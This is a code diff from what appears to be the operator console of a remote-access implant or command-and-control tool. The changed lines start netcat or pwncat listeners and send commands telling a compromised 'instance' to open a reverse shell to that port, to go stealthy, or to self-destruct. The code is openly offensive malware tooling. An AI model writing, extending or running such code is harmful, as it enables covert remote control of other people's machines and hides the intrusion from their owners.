@@ -12,6 +12,7 @@ from threading import Lock
 from time import sleep
 from typing import Callable, Optional, Tuple
 
+from core.command import CommandRequest, CommandTypes
 from core.message import *
 
 from instance import Instance
@@ -136,22 +137,25 @@ class App:
         while time.perf_counter() - start < 3:
             sleep(0.1)
             if subprocess.call(f'netstat -lant | grep 0.0.0.0:{port}', shell=True, stdout=subprocess.DEVNULL) == 0:
-                self.selected_instance.messages_to_send.put(OpenReverseShellRequest(port))
+                message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.OPEN_SHELL, {"port": port}).to_json())
+                self.selected_instance.messages_to_send.put(message)
                 return
         else:
             logger.warn(f"pwncat didn't start within 3 secs :(")
 
     def _do_self_destruct(self):
-        self.selected_instance.messages_to_send.put(SelfDestructRequest())
+        # self.selected_instance.messages_to_send.put(SelfDestructRequest())
+        raise NotImplementedError()
 
     def _do_open_shell_bash(self):
         port = get_open_port()
         open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{self.selected_instance.username}@{port}')
         sleep(0.1)  # just wait a tiny bit for nc to start
-        self.selected_instance.messages_to_send.put(OpenReverseShellRequest(port))
+        message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.OPEN_SHELL, {"port": port}).to_json())
+        self.selected_instance.messages_to_send.put(message)
 
     def _do_stealth(self):
-        self.selected_instance.messages_to_send.put(GoStealthyRequest())
+        self.selected_instance.messages_to_send.put(Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.GO_STEALTHY).to_json()))
 
     def _on_instances_update(self, instances: Tuple[Instance], new_or_deleted_instance: Optional[Instance] = None):
         if new_or_deleted_instance is not None:
